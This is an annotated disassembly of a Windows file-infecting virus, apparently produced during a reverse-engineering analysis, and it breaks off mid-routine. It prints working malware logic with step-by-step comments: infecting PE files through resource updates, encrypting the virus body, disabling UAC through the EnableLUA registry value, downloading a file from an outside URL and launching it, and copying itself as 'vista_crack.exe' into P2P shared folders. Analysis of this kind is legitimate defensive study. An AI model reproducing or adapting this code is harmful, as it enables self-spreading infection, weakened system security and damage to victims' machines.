.text:00401C08 03 BD 36 1A 40 00                          add     edi, ss:v_file_ll_handle[ebp] ; add the file offset to the entry point (store in edi)
.text:00401C0E 56                                         push    esi             ; save esi
.text:00401C0F 8D B5 77 10 40 00                          lea     esi, dump_bytes[ebp] ; load the address of dump_bytes location
.text:00401C15 87 F7                                      xchg    esi, edi        ; swap esi and edi, esi = file hanhlde + entry point, edi = dump_bytes location
.text:00401C17 B9 00 02 00 00                             mov     ecx, 200h       ; set counter to 200
.text:00401C1C F3 A4                                      rep movsb               ; copy file's 200h bytes to memory at dump_bytes
.text:00401C1E 5E                                         pop     esi             ; restore esi
.text:00401C1F 5F                                         pop     edi             ; restore edi
.text:00401C20 33 C9                                      xor     ecx, ecx        ; zero out ecx
.text:00401C22 33 D2                                      xor     edx, edx        ; zero out edx
.text:00401C24 66 8B 4E 06                                mov     cx, [esi+6]     ; grab the number of sections
.text:00401C28 66 8B 56 14                                mov     dx, [esi+14h]   ; grab the size of the optional header
.text:00401C2C 83 C6 18                                   add     esi, 18h        ; set esi to Image Optional Header
.text:00401C2F 03 F2                                      add     esi, edx        ; Go to first image section header
.text:00401C31 60                                         pusha
.text:00401C32
.text:00401C32                            image_section_header_search_start:      ; CODE XREF: nfkt_this+B3\u2193j
.text:00401C32 83 7E 10 00                                cmp     dword ptr [esi+10h], 0 ; check if the size of the raw data is zero
.text:00401C36 0F 84 4A FF FF FF                          jz      exit_section_crawl ; if it is zero, jump
.text:00401C3C 83 C6 28                                   add     esi, 28h ; '('  ; if not, move on to the next image section header
.text:00401C3F E2 F1                                      loop    image_section_header_search_start ; loop to find the first empty section
.text:00401C41 61                                         popa                    ; restores registers (notably cx and esi)
.text:00401C42 60                                         pusha                   ; saves registers
.text:00401C43
.text:00401C43                            rsr_check:                              ; CODE XREF: nfkt_this+C2\u2193j
.text:00401C43 81 3E 2E 72 73 72                          cmp     dword ptr [esi], 'rsr.' ; checking if the name of section header ends with .rsr
.text:00401C49 74 0A                                      jz      short loc_401C55 ; if it does, jump
.text:00401C4B 83 C6 28                                   add     esi, 28h ; '('  ; if not, check next section header
.text:00401C4E E2 F3                                      loop    rsr_check       ; loop, crawl through the section headers
.text:00401C50 E9 31 FF FF FF                             jmp     exit_section_crawl ; if no .rsr is found, exit section crawl
.text:00401C55                            ; ---------------------------------------------------------------------------
.text:00401C55
.text:00401C55                            loc_401C55:                             ; CODE XREF: nfkt_this+BD\u2191j
.text:00401C55 49                                         dec     ecx             ; move back to the rsr section header
.text:00401C56 0B C9                                      or      ecx, ecx        ; check if it is zero
.text:00401C58 74 05                                      jz      short loc_401C5F ; if it is zero, jump
.text:00401C5A E9 27 FF FF FF                             jmp     exit_section_crawl ; otherwise, exit crawl
.text:00401C5F                            ; ---------------------------------------------------------------------------
.text:00401C5F
.text:00401C5F                            loc_401C5F:                             ; CODE XREF: nfkt_this+CC\u2191j
.text:00401C5F 61                                         popa                    ; restors registers
.text:00401C60 FF B5 36 1A 40 00                          push    ss:v_file_ll_handle[ebp] ; push file handle to stack to be freed
.text:00401C66 FF 95 7F 17 40 00                          call    ss:FreeLibraryf[ebp] ; free reference to file
.text:00401C6C 68 20 17 00 00                             push    1720h           ; push the size of the virus for alloc call
.text:00401C71 6A 00                                      push    0               ; flags = 0
.text:00401C73 FF 95 53 17 40 00                          call    ss:GlobalAlloc[ebp] ; allocate memory the size of the virus
.text:00401C79 0B C0                                      or      eax, eax        ; see if failed
.text:00401C7B 0F 84 E1 01 00 00                          jz      exit_infect     ; if it did, exit
.text:00401C81 89 85 2E 1A 40 00                          mov     ss:v_mem[ebp], eax ; otherwise, store the pointer to the allocated memory
.text:00401C87 BE 00 10 40 00                             mov     esi, offset start ; grab the offset to the start of the virus
.text:00401C8C 03 F5                                      add     esi, ebp        ; make address non relative by adding ebp
.text:00401C8E 8B BD 2E 1A 40 00                          mov     edi, ss:v_mem[ebp] ; set destination to allocated memory addr
.text:00401C94 B9 20 17 00 00                             mov     ecx, 1720h      ; set counter to number of bytes in virus
.text:00401C99 F3 A4                                      rep movsb               ; copy virus to memory
.text:00401C9B B9 20 17 00 00                             mov     ecx, 1720h      ; set ecx to virus size
.text:00401CA0 81 E9 72 00 00 00                          sub     ecx, 72h ; 'r'  ; subtract the stub size (decryptor)
.text:00401CA6 8B 85 2E 1A 40 00                          mov     eax, ss:v_mem[ebp] ; grab the start of memory allocated addr
.text:00401CAC 05 72 00 00 00                             add     eax, 72h ; 'r'  ; add the stub size, offset into COPIED virus to encrypt
.text:00401CB1
.text:00401CB1                            Encrypt:                                ; CODE XREF: nfkt_this+13A\u2193j
.text:00401CB1 51                                         push    ecx             ; START ENCRYPTION: save the size - stub
.text:00401CB2 66 8B 08                                   mov     cx, [eax]       ; grab the byte at ecx
.text:00401CB5 86 E9                                      xchg    ch, cl          ; swap ch and cl
.text:00401CB7 D2 C5                                      rol     ch, cl          ; roll right
.text:00401CB9 66 89 08                                   mov     [eax], cx       ; write back to memory
.text:00401CBC 83 C0 02                                   add     eax, 2          ; incrmement location  by 2 bytes
.text:00401CBF 59                                         pop     ecx             ; restore ecx
.text:00401CC0 83 E9 02                                   sub     ecx, 2          ; decrement the loop counter
.text:00401CC3 83 F9 00                                   cmp     ecx, 0          ; see if we are at the end of the virus
.text:00401CC6 77 E9                                      ja      short Encrypt   ; if not, continue the encryption
.text:00401CC8 6A 00                                      push    0               ; push zero to stack (delete exisiting resource = FALSE)
.text:00401CCA FF B5 1A 1A 40 00                          push    ss:v_file[ebp]  ; push file to update's name
.text:00401CD0 FF 95 3F 17 40 00                          call    ss:BeginUpdateFunction[ebp] ; call begin update function, get handle
.text:00401CD6 0B C0                                      or      eax, eax        ; check if successful
.text:00401CD8 0F 84 84 01 00 00                          jz      exit_infect     ; if not exit
.text:00401CDE 50                                         push    eax             ; save handle to stack
.text:00401CDF 68 20 17 00 00                             push    1720h           ; push virus size to stack
.text:00401CE4 FF B5 2E 1A 40 00                          push    ss:v_mem[ebp]   ; push encrypted virus from memory's addr to stack
.text:00401CEA 6A 09                                      push    9               ; langauge = english (mistake, should have used all language)
.text:00401CEC 68 D2 04 00 00                             push    4D2h            ; push 1234 (resource ID,name)
.text:00401CF1 6A 0A                                      push    0Ah             ; push RT_RCDATA, type
.text:00401CF3 50                                         push    eax             ; push handle to stack (of file to 'update')
.text:00401CF4 FF 95 43 17 40 00                          call    ss:UpdateResource[ebp] ; call update resource to infect file
.text:00401CFA 0B C0                                      or      eax, eax        ; see if successful
.text:00401CFC 0F 84 60 01 00 00                          jz      exit_infect     ; if not, quit
.text:00401D02 58                                         pop     eax             ; push update resource handle to stack
.text:00401D03 6A 00                                      push    0               ; push discard = false
.text:00401D05 50                                         push    eax             ; push update resource handle to stack
.text:00401D06 FF 95 47 17 40 00                          call    ss:EndUpdateResource[ebp] ; end the resource update
.text:00401D0C 0B C0                                      or      eax, eax        ; see if successful
.text:00401D0E 0F 84 4E 01 00 00                          jz      exit_infect     ; if not, quit
.text:00401D14 33 C0                                      xor     eax, eax        ; zero out eax
.text:00401D16 50                                         push    eax             ; pushing zero to stack
.text:00401D17 50                                         push    eax             ; flags and templates (0)
.text:00401D18 6A 03                                      push    3               ; creation disp = 3
.text:00401D1A 50                                         push    eax             ; security attributed (0)
.text:00401D1B 6A 02                                      push    2               ; share mode = 2
.text:00401D1D 68 00 00 00 C0                             push    0C0000000h      ; access (r/w)
.text:00401D22 FF B5 1A 1A 40 00                          push    ss:v_file[ebp]  ; push the file handle to the stack as arg
.text:00401D28 FF 95 2F 17 40 00                          call    ss:CreateFile[ebp] ; call CreateFile
.text:00401D2E 0B C0                                      or      eax, eax        ; if  not successful
.text:00401D30 0F 84 57 F6 FF FF                          jz      Exit            ; EXIT if not succ
.text:00401D36 89 85 2A 1A 40 00                          mov     ss:virus_fh[ebp], eax ; store the virus filehandle
.text:00401D3C 6A 00                                      push    0               ; lpFileSizeHigh
.text:00401D3E 50                                         push    eax             ; hFile
.text:00401D3F FF 95 4F 17 40 00                          call    ss:GetFileSize[ebp] ; call get file size
.text:00401D45 0B C0                                      or      eax, eax        ; if not successful
.text:00401D47 0F 84 15 01 00 00                          jz      exit_infect     ; exit infection
.text:00401D4D 89 85 32 1A 40 00                          mov     ss:offset_vsize[ebp], eax ; save virus file size to memory
.text:00401D53 50                                         push    eax             ; dwBytes - filesize
.text:00401D54 6A 00                                      push    0               ; uFlags
.text:00401D56 FF 95 53 17 40 00                          call    ss:GlobalAlloc[ebp] ; call global alloc (allocating the memory to copy the virus file)
.text:00401D5C 0B C0                                      or      eax, eax        ; check if it worked
.text:00401D5E 0F 84 FE 00 00 00                          jz      exit_infect     ; if not, exit
.text:00401D64 89 85 2E 1A 40 00                          mov     ss:v_mem[ebp], eax ; store the alloc mem pointer to memory
.text:00401D6A 6A 00                                      push    0               ; lpOverlapped
.text:00401D6C B8 36 1A 40 00                             mov     eax, offset v_file_ll_handle ; grab the virus file load library's handle
.text:00401D71 03 C5                                      add     eax, ebp        ; make addr non relative
.text:00401D73 50                                         push    eax             ; lpNumberOfBytesRead - scroll up to the virus
.text:00401D74 FF B5 32 1A 40 00                          push    ss:offset_vsize[ebp] ; nNumberOfBytesToRead = virus size
.text:00401D7A FF B5 2E 1A 40 00                          push    ss:v_mem[ebp]   ; lpBuffer
.text:00401D80 FF B5 2A 1A 40 00                          push    ss:virus_fh[ebp] ; hFile
.text:00401D86 FF 95 3B 17 40 00                          call    ss:ReadFile[ebp] ; call ReadFile() on the infected file
.text:00401D8C 0B C0                                      or      eax, eax        ; see if successful
.text:00401D8E 0F 84 CE 00 00 00                          jz      exit_infect     ; if not, exit
.text:00401D94 8B B5 2E 1A 40 00                          mov     esi, ss:v_mem[ebp] ; set esi to start of allocated memory where read in file sits
.text:00401D9A 66 81 3E 4D 5A                             cmp     word ptr [esi], 'ZM' ; see if it starts with MZ
.text:00401D9F 0F 85 BD 00 00 00                          jnz     exit_infect     ; if not, exit
.text:00401DA5 03 76 3C                                   add     esi, [esi+3Ch]  ; image nt header signature == PE ?
.text:00401DA8 66 81 3E 50 45                             cmp     word ptr [esi], 'EP' ; ==  PE?
.text:00401DAD 0F 85 AF 00 00 00                          jnz     exit_infect     ; if not, exit
.text:00401DB3 56                                         push    esi             ; save esi
.text:00401DB4 33 C9                                      xor     ecx, ecx        ; zero out ecx
.text:00401DB6 33 DB                                      xor     ebx, ebx        ; zero out ebx
.text:00401DB8 66 8B 5E 14                                mov     bx, [esi+14h]   ; grab size of optional header
.text:00401DBC 66 8B 4E 06                                mov     cx, [esi+6]     ; grab number of sections
.text:00401DC0 83 C6 18                                   add     esi, 18h        ; going into the optional header
.text:00401DC3 03 F3                                      add     esi, ebx        ; going to the first image section header
.text:00401DC5 8B D6                                      mov     edx, esi        ; save the loc of the first image section header to edx
.text:00401DC7 56                                         push    esi             ; arguments for find first section : save esi, starting point
.text:00401DC8 51                                         push    ecx             ; number of sections
.text:00401DC9 E8 47 FD FF FF                             call    find_first_section ; call find first section
.text:00401DCE 89 85 26 1A 40 00                          mov     ss:firstSectionOffset[ebp], eax ; store first section
.text:00401DD4 59                                         pop     ecx             ; restore ecx, number of sections
.text:00401DD5 5E                                         pop     esi             ; restore the starting point
.text:00401DD6 33 DB                                      xor     ebx, ebx        ; zero out ebx
.text:00401DD8
.text:00401DD8                            loop_rsr:                               ; CODE XREF: nfkt_this+257\u2193j
.text:00401DD8 81 3E 2E 72 73 72                          cmp     dword ptr [esi], 'rsr.' ; check if image section name starts with rsr
.text:00401DDE 74 07                                      jz      short found_rsrc ; jump of found
.text:00401DE0 83 C6 28                                   add     esi, 28h ; '('  ; move on to the next section
.text:00401DE3 E2 F3                                      loop    loop_rsr        ; keep checking
.text:00401DE5 EB 7B                                      jmp     short exit_infect ; exit if not found
.text:00401DE7                            ; ---------------------------------------------------------------------------
.text:00401DE7
.text:00401DE7                            found_rsrc:                             ; CODE XREF: nfkt_this+252\u2191j
.text:00401DE7 C7 46 24 40 00 00 C0                       mov     dword ptr [esi+24h], 0C0000040h ; Changes the characteristics of the image (read/write/init)
.text:00401DEE 8B 4E 10                                   mov     ecx, [esi+10h]  ; ecx = size of raw data
.text:00401DF1 8B 76 14                                   mov     esi, [esi+14h]  ; esi = pointer to raw data
.text:00401DF4 03 B5 2E 1A 40 00                          add     esi, ss:v_mem[ebp] ; make the address non relative
.text:00401DFA 51                                         push    ecx             ; save size of raw data
.text:00401DFB
.text:00401DFB                            loop_marker:                            ; CODE XREF: nfkt_this+27A\u2193j
.text:00401DFB 8B 95 00 10 40 00                          mov     edx, dword ptr ss:start[ebp] ; edx = pointer to start of current virus
.text:00401E01 39 16                                      cmp     [esi], edx      ; compares the beggining of the section to the virus itself
.text:00401E03 74 03                                      jz      short here_vir  ; if equal, jump
.text:00401E05 46                                         inc     esi             ; keep incrementing the pointer to look for the start of the virus
.text:00401E06 E2 F3                                      loop    loop_marker     ; keep checking
.text:00401E08
.text:00401E08                            here_vir:                               ; CODE XREF: nfkt_this+277\u2191j
.text:00401E08 60                                         pusha                   ; save all
.text:00401E09 E8 F9 FB FF FF                             call    encrypt_2       ; call this to encrypt it now that we found the start
.text:00401E0E 61                                         popa                    ; restore
.text:00401E0F 5A                                         pop     edx             ; edx = size of raw data
.text:00401E10 2B D1                                      sub     edx, ecx        ; edx = size fo raw data after the start of virus
.text:00401E12 5F                                         pop     edi             ; edi = image nt header
.text:00401E13 03 97 88 00 00 00                          add     edx, [edi+88h]  ; add the offset to virtual address of the Export resource
.text:00401E19 03 57 34                                   add     edx, [edi+34h]  ; add the offset to ImageBase
.text:00401E1C 89 95 56 1A 40 00                          mov     ss:virus_enteryPoint[ebp], edx ; save that to memory
.text:00401E22 8B 85 26 1A 40 00                          mov     eax, ss:firstSectionOffset[ebp] ; eax = pointer to first section that we found
.text:00401E28 E8 0E FD FF FF                             call    fixEnteryPoint  ; call fix entery point
.text:00401E2D 6A 00                                      push    0               ; file
.text:00401E2F 6A 00                                      push    0               ; push 0 distance to move
.text:00401E31 6A 00                                      push    0               ; push 0
.text:00401E33 FF B5 2A 1A 40 00                          push    ss:virus_fh[ebp] ; hFile pointer to the file
.text:00401E39 FF 95 57 17 40 00                          call    ss:SetFilePointer[ebp] ; call set File pointer, moves file pointer to the front of the file
.text:00401E3F 6A 00                                      push    0               ; lpOverlapped
.text:00401E41 B8 36 1A 40 00                             mov     eax, offset v_file_ll_handle ; eax = file handle
.text:00401E46 03 C5                                      add     eax, ebp        ; make it non relative
.text:00401E48 50                                         push    eax             ; lpNumberOfBytesWritten
.text:00401E49 FF B5 32 1A 40 00                          push    ss:offset_vsize[ebp] ; nNumberOfBytesToWrite the remaining bytes to write
.text:00401E4F FF B5 2E 1A 40 00                          push    ss:v_mem[ebp]   ; lpBuffer the allocated memory of the virus file
.text:00401E55 FF B5 2A 1A 40 00                          push    ss:virus_fh[ebp] ; hFile file handel for the virus
.text:00401E5B FF 95 37 17 40 00                          call    ss:WriteFile[ebp] ; call write file
.text:00401E61 C3                                         retn
.text:00401E62                            ; ---------------------------------------------------------------------------
.text:00401E62
.text:00401E62                            exit_infect:                            ; CODE XREF: nfkt_this-5\u2191j
.text:00401E62                                                                    ; nfkt_this+14\u2191j ...
.text:00401E62 C3                                         retn
.text:00401E62                            nfkt_this       endp ; sp-analysis failed
.text:00401E62
.text:00401E62                            ; ---------------------------------------------------------------------------
.text:00401E63 59 6F 75 20 6E 65 65 64 20+aYouNeedAdminis db 'You need Administrator Privilege to run this Application',0
.text:00401E63 41 64 6D 69 6E 69 73 74 72+                                        ; DATA XREF: payload1+A\u2193o
.text:00401E9C 45 72 72 6F 72 00          aError          db 'Error',0            ; DATA XREF: payload1+10\u2193o
.text:00401EA2 49 6E 69 74 69 61 6C 69 7A+aInitializesrwl db 'InitializeSRWLock',0
.text:00401EA2 65 53 52 57 4C 6F 63 6B 00                                         ; DATA XREF: payload1:loc_401ED7\u2193o
.text:00401EB4
.text:00401EB4                            ; =============== S U B R O U T I N E =======================================
.text:00401EB4
.text:00401EB4
.text:00401EB4                            payload1        proc near               ; CODE XREF: start:CorvinJumps\u2191p
.text:00401EB4 FF 95 0B 18 40 00                          call    ss:IsUserAnAdmin[ebp] ; call isUserAdmin
.text:00401EBA 0B C0                                      or      eax, eax        ; check is Admin
.text:00401EBC 75 19                                      jnz     short loc_401ED7 ; jump if Admin
.text:00401EBE 8D 85 63 1E 40 00                          lea     eax, aYouNeedAdminis[ebp] ; load addr of You need Administrator Privilege to run this Application
.text:00401EC4 8D 95 9C 1E 40 00                          lea     edx, aError[ebp] ; load addr of the error
.text:00401ECA 6A 10                                      push    10h             ; makes it look like an error
.text:00401ECC 52                                         push    edx             ; Body
.text:00401ECD 50                                         push    eax             ; title of the message box
.text:00401ECE 6A 00                                      push    0               ; this arg is the owner window
.text:00401ED0 FF 95 CD 13 40 00                          call    ss:AddrMessageBox[ebp] ; call MessageBox to create a message box
.text:00401ED6 C3                                         retn
.text:00401ED7                            ; ---------------------------------------------------------------------------
.text:00401ED7
.text:00401ED7                            loc_401ED7:                             ; CODE XREF: payload1+8\u2191j
.text:00401ED7 8D 85 A2 1E 40 00                          lea     eax, aInitializesrwl[ebp] ; grab addr of InitializeSRWLock
.text:00401EDD 50                                         push    eax             ; lpProcName (that string for the lock)
.text:00401EDE FF B5 EA 13 40 00                          push    ss:Kernel32Base[ebp] ; hModule (kernel)
.text:00401EE4 FF 95 49 14 40 00                          call    ss:GetProcAddress[ebp] ; call get Proc addr
.text:00401EEA 0B C0                                      or      eax, eax        ; check if succesful, then we are on Vista
.text:00401EEC 74 06                                      jz      short locret_401EF4 ; jump if not on Vista
.text:00401EEE E8 52 00 00 00                             call    fix_vista       ; if on Vista, call fix_Vista
.text:00401EF3 C3                                         retn
.text:00401EF4                            ; ---------------------------------------------------------------------------
.text:00401EF4
.text:00401EF4                            locret_401EF4:                          ; CODE XREF: payload1+38\u2191j
.text:00401EF4 C3                                         retn
.text:00401EF4                            payload1        endp ; sp-analysis failed
.text:00401EF4
.text:00401EF4                            ; ---------------------------------------------------------------------------
.text:00401EF5 53 6F 66 74 77 61 72 65 5C+aSoftwareMicros db 'Software\Microsoft\Windows\CurrentVersion\Policies\System',0
.text:00401EF5 4D 69 63 72 6F 73 6F 66 74+                                        ; DATA XREF: fix_vista+B\u2193o
.text:00401F2F 45 6E 61 62 6C 65 4C 55 41+aEnablelua      db 'EnableLUA',0        ; DATA XREF: fix_vista+37\u2193o
.text:00401F39 04 00 00 00                size_key        dd 4                    ; DATA XREF: fix_vista+26\u2193r
.text:00401F3D 00 00 00                   byte_401F3D     db 3 dup(0)             ; DATA XREF: fix_vista+2C\u2193o
.text:00401F40 00                                         db 0
.text:00401F41 00 00 00 00                RegHandle       dd 0                    ; DATA XREF: fix_vista\u2193o
.text:00401F41                                                                    ; fix_vista+1D\u2193r ...
.text:00401F45
.text:00401F45                            ; =============== S U B R O U T I N E =======================================
.text:00401F45
.text:00401F45
.text:00401F45                            fix_vista       proc near               ; CODE XREF: payload1+3A\u2191p
.text:00401F45 8D 85 41 1F 40 00                          lea     eax, RegHandle[ebp] ; disabling LUA here, eax = addr of reg handle
.text:00401F4B 50                                         push    eax             ; push it to the stack
.text:00401F4C 6A 02                                      push    2               ; k_set_value
.text:00401F4E 6A 00                                      push    0               ; 0 as arg
.text:00401F50 8D 85 F5 1E 40 00                          lea     eax, aSoftwareMicros[ebp] ; Offset to the HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System where u disable UAC
.text:00401F56 50                                         push    eax             ; put that on the stack
.text:00401F57 68 02 00 00 80                             push    80000002h       ; HKEY_LOCAL_MACHINE
.text:00401F5C FF 95 E5 17 40 00                          call    ss:RegOpenKeyExA[ebp] ; call RegOpenKeyEx
.text:00401F62 83 3D 41 1F 40 00 00                       cmp     RegHandle, 0    ; check if error
.text:00401F69 74 30                                      jz      short locret_401F9B ; jump to return
.text:00401F6B FF B5 39 1F 40 00                          push    ss:size_key[ebp] ; push size of key which is 4
.text:00401F71 8D 85 3D 1F 40 00                          lea     eax, byte_401F3D[ebp] ; the value to write(0)
.text:00401F77 50                                         push    eax             ; phkResult
.text:00401F78 6A 04                                      push    4               ; samDesired
.text:00401F7A 6A 00                                      push    0               ; ulOptions
.text:00401F7C 8D 85 2F 1F 40 00                          lea     eax, aEnablelua[ebp] ; addr of "EnableLUA"
.text:00401F82 50                                         push    eax             ; lpSubKey
.text:00401F83 FF B5 41 1F 40 00                          push    ss:RegHandle[ebp] ; hKey
.text:00401F89 FF 95 ED 17 40 00                          call    ss:RegSetValueExA[ebp] ; Calls RegSetValue and sets the EnableLUA to 0 which disables UAC.
.text:00401F8F FF B5 41 1F 40 00                          push    ss:RegHandle[ebp] ; hKey
.text:00401F95 FF 95 F1 17 40 00                          call    ss:RegCloseKey[ebp] ; calls RegCloseKey witht he key as arg
.text:00401F9B
.text:00401F9B                            locret_401F9B:                          ; CODE XREF: fix_vista+24\u2191j
.text:00401F9B C3                                         retn
.text:00401F9B                            fix_vista       endp ; sp-analysis failed
.text:00401F9B
.text:00401F9B                            ; ---------------------------------------------------------------------------
.text:00401F9C 68 74 74 70 3A 2F 2F 77 77+aHttpWwwSaddams db 'http://www.saddamsfamily.com/sf-logony.jpg',0
.text:00401F9C 77 2E 73 61 64 64 61 6D 73+                                        ; DATA XREF: payload2+52\u2193o
.text:00401FC7 63 3A 5C 73 61 64 64 61 6D+aCSaddamsfamily db 'c:\saddamsfamily.jpg',0
.text:00401FC7 73 66 61 6D 69 6C 79 2E 6A+                                        ; DATA XREF: payload2+4B\u2193o
.text:00401FDC 65 78 70 6C 6F 72 65 72 2E+aExplorerExeCSa db 'explorer.exe "c:\saddamsfamily.jpg"',0
.text:00401FDC 65 78 65 20 22 63 3A 5C 73+                                        ; DATA XREF: payload2+69\u2193o
.text:00402000 55 52 4C 44 6F 77 6E 6C 6F+aUrldownloadtof db 'URLDownloadToFileA',0
.text:00402000 61 64 54 6F 46 69 6C 65 41+                                        ; DATA XREF: payload2+39\u2193o
.text:00402013 75 72 6C 6D 6F 6E 2E 64 6C+aUrlmonDll      db 'urlmon.dll',0       ; DATA XREF: payload2+28\u2193o
.text:0040201E 00 00                                      align 10h
.text:00402020 00 00                                      db 2 dup(0)
.text:00402022 00 00                      buftime         dw 0                    ; DATA XREF: payload2+2\u2193o
.text:00402022                                                                    ; payload2+1B\u2193o
.text:00402024 00 00                                      db 2 dup(0)
.text:00402026 64 64 00                   aDd             db 'dd',0               ; DATA XREF: payload2+9\u2193o
.text:00402029
.text:00402029                            ; =============== S U B R O U T I N E =======================================
.text:00402029
.text:00402029                            ; store 4 onto stack
.text:00402029
.text:00402029                            payload2        proc near               ; CODE XREF: start+31D\u2191p
.text:00402029                                                                    ; start+337\u2191p
.text:00402029 6A 04                                      push    4               ; store four on the stack
.text:0040202B 8D 85 22 20 40 00                          lea     eax, buftime[ebp] ; load address of where to write the time
.text:00402031 50                                         push    eax             ; push that address to the stack
.text:00402032 8D 85 26 20 40 00                          lea     eax, aDd[ebp]   ; grab date time format string (just the day)
.text:00402038 50                                         push    eax             ; save that to the stack
.text:00402039 33 C0                                      xor     eax, eax        ; zero out eax
.text:0040203B 50                                         push    eax             ; push zero to the stack
.text:0040203C 50                                         push    eax             ; ""
.text:0040203D 50                                         push    eax             ; ""
.text:0040203E FF 95 5F 17 40 00                          call    ss:GetDateFormatF[ebp] ; call GetDateFormatF, get day of the month
.text:00402044 8D 85 22 20 40 00                          lea     eax, buftime[ebp] ; load the value from the get date call (get the day of the month)
.text:0040204A 66 81 38 30 39                             cmp     word ptr [eax], '90' ; Is today the 9th of the month?
.text:0040204F 75 4E                                      jnz     short locret_40209F ; if not, jump (don't preform payload)
.text:00402051 8D 85 13 20 40 00                          lea     eax, aUrlmonDll[ebp] ; grab urlmon.dll string (need for downloading)
.text:00402057 50                                         push    eax             ; push reference to stack
.text:00402058 FF 95 7B 17 40 00                          call    ss:AddrLoadLibrary[ebp] ; Load urlmon.dll
.text:0040205E 0B C0                                      or      eax, eax        ; did it work?
.text:00402060 74 3D                                      jz      short locret_40209F ; if not, exit
.text:00402062 8D 95 00 20 40 00                          lea     edx, aUrldownloadtof[ebp] ; grab string: URLDownloadToFile (api)
.text:00402068 52                                         push    edx             ; lpProcName - urldownloadtofile
.text:00402069 50                                         push    eax             ; hModule - the urlmon.dll
.text:0040206A FF 95 49 14 40 00                          call    ss:GetProcAddress[ebp] ; load the API to dowload urls to a file
.text:00402070 33 D2                                      xor     edx, edx        ; clear
.text:00402072 52                                         push    edx             ; push zero
.text:00402073 52                                         push    edx             ; push zero
.text:00402074 8D 9D C7 1F 40 00                          lea     ebx, aCSaddamsfamily[ebp] ; load addr of string: c:\\saddamsfamily.jpg (lmao)
.text:0040207A 53                                         push    ebx             ; push this as the destination for the download
.text:0040207B 8D 9D 9C 1F 40 00                          lea     ebx, aHttpWwwSaddams[ebp] ; grab the url to download the saddamsfamily photo from
.text:00402081 53                                         push    ebx             ; push that to the stack (url source)
.text:00402082 52                                         push    edx             ; push zero to the stack
.text:00402083 FF D0                                      call    eax             ; call URLDownloadToFile (download the saddam photo to C://)
.text:00402085 68 B8 0B 00 00                             push    3000            ; waits 3000 mlseconds
.text:0040208A FF 95 63 17 40 00                          call    ss:dword_401763[ebp] ; Sleep for 3000 ms to let download
.text:00402090 6A 05                                      push    5               ; uCmdShow
.text:00402092 8D 85 DC 1F 40 00                          lea     eax, aExplorerExeCSa[ebp] ; load string with command to open explorer.exe and open the saddamfamily.jpg photo. what a troll.
.text:00402098 50                                         push    eax             ; lpCmdLine - load the command up
.text:00402099 FF 95 9F 17 40 00                          call    ss:WinExec[ebp] ; execute the command (show the photo downloaded)
.text:0040209F
.text:0040209F                            locret_40209F:                          ; CODE XREF: payload2+26\u2191j
.text:0040209F                                                                    ; payload2+37\u2191j
.text:0040209F C3                                         retn
.text:0040209F                            payload2        endp
.text:0040209F
.text:0040209F                            ; ---------------------------------------------------------------------------
.text:004020A0 63 3A 5C 50 72 6F 67 72 61+aCProgramFilesK db 'c:\Program Files\Kazaa Lite\My Shared Folder\vista_crack.exe',0
.text:004020A0 6D 20 46 69 6C 65 73 5C 4B+                                        ; DATA XREF: payload3\u2193o
.text:004020DD 63 3A 5C 50 72 6F 67 72 61+aCProgramFilesK_0 db 'c:\Program Files\Kazaa\My Shared Folder\vista_crack.exe',0
.text:00402115 63 3A 5C 50 72 6F 67 72 61+aCProgramFilesE db 'c:\Program Files\Edonkey2000\Incoming\vista_crack.exe',0
.text:0040214B 63 3A 5C 50 72 6F 67 72 61+aCProgramFilesI db 'c:\Program Files\Icq\Shared Files\vista_crack.exe',0
.text:0040217D 63 3A 5C 50 72 6F 67 72 61+aCProgramFilesE_0 db 'c:\Program Files\emule\incoming\vista_crack.exe',0
.text:004021AD 63 3A 5C 50 72 6F 67 72 61+aCProgramFilesG db 'c:\Program Files\Gnucleus\Downloads\Incoming\vista_crack.exe',0
.text:004021EA 63 3A 5C 50 72 6F 67 72 61+aCProgramFilesK_1 db 'c:\Program Files\KMD\My Shared Folder\vista_crack.exe',0
.text:00402220 63 3A 5C 50 72 6F 67 72 61+aCProgramFilesL db 'c:\Program Files\Limewire\Shared\vista_crack',0
.text:0040224D
.text:0040224D                            ; =============== S U B R O U T I N E =======================================
.text:0040224D
.text:0040224D
.text:0040224D                            payload3        proc near               ; CODE XREF: start+322\u2191p
.text:0040224D                                                                    ; start+327\u2191p ...
.text:0040224D 8D B5 A0 20 40 00                          lea     esi, aCProgramFilesK[ebp] ; esi = addr of beg of the P2P infection list (strings of all eligable programs)
.text:00402253 6A 08                                      push    8               ; push 8 as number to infect is they exist
.text:00402255 59                                         pop     ecx             ; ecx = that number (8) as a counter
.text:00402256
.text:00402256                            loc_402256:                             ; CODE XREF: payload3+25\u2193j
.text:00402256 51                                         push    ecx             ; save
.text:00402257 56                                         push    esi             ; save
.text:00402258 6A 00                                      push    0               ; arg, FALSE
.text:0040225A 56                                         push    esi             ; path name from the P2P names with "/vista_crack.exe"
.text:0040225B FF B5 9D 23 40 00                          push    ss:FileName[ebp] ; grab the file name
.text:00402261 FF 95 8B 17 40 00                          call    ss:CopyFileF[ebp] ; call CopyFileF, copies itself as vist_crack into the P2P shared folders if they exist
.text:00402267 5E                                         pop     esi             ; restore
.text:00402268
.text:00402268                            loooooooop:                             ; CODE XREF: payload3+21\u2193j
.text:00402268 80 3E 00                                   cmp     byte ptr [esi], 0 ; check if we are at the end of the string yet (string is the path we pretty much want to get to the next one)
.text:0040226B 74 03                                      jz      short loc_402270 ; if so, jump to move to the next P2P folder
.text:0040226D 46                                         inc     esi             ; else, esi++ to get there
.text:0040226E EB F8                                      jmp     short loooooooop ; loop to get there
.text:00402270                            ; ---------------------------------------------------------------------------
.text:00402270
.text:00402270                            loc_402270:                             ; CODE XREF: payload3+1E\u2191j
.text:00402270 46                                         inc     esi             ; esi++, now it's gonna point to the beg of the next P2P folder path
.text:00402271 59                                         pop     ecx             ; restore ecx as 8
.text:00402272 E2 E2                                      loop    loc_402256      ; loop (if ecx not 0 meaning more P2P folders remaining) to get to the next P2P folder and do the same.
.text:00402274 C3                                         retn                    ; return
.text:00402274                            payload3        endp
.text:00402274
.text:00402274                            ; ---------------------------------------------------------------------------
.text:00402275 61 3A 5C 00                root            db 'a:\',0              ; DATA XREF: payload4+8\u2193o
.text:00402275                                                                    ; dropAndInfect+24\u2193o
.text:00402279
.text:00402279                            ; =============== S U B R O U T I N E =======================================
.text:00402279
.text:00402279                            ; GetLogicalDrive
.text:00402279
.text:00402279                            payload4        proc near               ; CODE XREF: start+32C\u2191p
.text:00402279                                                                    ; start+346\u2191p
